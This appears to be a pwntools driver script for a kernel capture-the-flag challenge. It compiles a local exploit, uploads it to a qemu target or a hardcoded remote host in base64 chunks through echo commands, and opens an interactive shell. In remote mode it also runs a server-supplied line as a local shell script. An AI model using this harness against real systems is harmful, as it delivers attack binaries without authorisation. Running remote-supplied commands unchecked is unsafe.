#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "167.99.37.61"
PORT =  9001

START_SCRIPT = "./start-qemu.sh"
DEBUG_SCRIPT = START_SCRIPT+".debug"
REMOTE_SCRIPT = START_SCRIPT

#PROMPT = "# "
PROMPT = "$ "
PKGSIZE = 300

def compile():
    log.info("Compile")
    res = os.system("musl-gcc -w -s -static -o3 pwn.c -o pwn -masm=intel")

    return res == 0

def exec_cmd(cmd):
    r.sendline(cmd)
    r.recvuntil(PROMPT)

def upload():    
    p = log.progress("Upload")

    with open("pwn", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data)

    current = 0
    total_len = len(encoded)

    while current < total_len:
        size = total_len-current

        if size > PKGSIZE:
            size = PKGSIZE

        p.status("%d / %d" % (current, total_len))
        exec_cmd("echo %s >> pwn.b64" % (encoded[current:current+size]))

        current += size

    exec_cmd("cat pwn.b64 | base64 -d > pwn")
    exec_cmd("chmod +x pwn")
    
    p.success()

def exploit(r):
    if not LOCAL:
        cmd = r.recvline()
        with open("exec.sh", "w") as f:
            f.write("#!/bin/sh\n")
            f.write(cmd)
        os.system("chmod +x exec.sh")
        pow = process("./exec.sh")
        pow.recvuntil("token: ")
        token = pow.recvline()
        pow.close()
        r.sendline(token)

    log.info("Booting")
    r.recvuntil(PROMPT)
    exec_cmd("cd /tmp")
    upload()

    r.interactive()
    
    return

if __name__ == "__main__":    
    if not compile():
        exit()

    if len(sys.argv) > 1:
        if sys.argv[1] == 'd':
            LOCAL = True
            r = process(DEBUG_SCRIPT)
            exploit(r)
        else:
            LOCAL = False
            r = remote(HOST, PORT)
            exploit(r)
    else:
        LOCAL = True
        r = process(START_SCRIPT)
        print util.proc.pidof(r)
        pause()
        exploit(r)
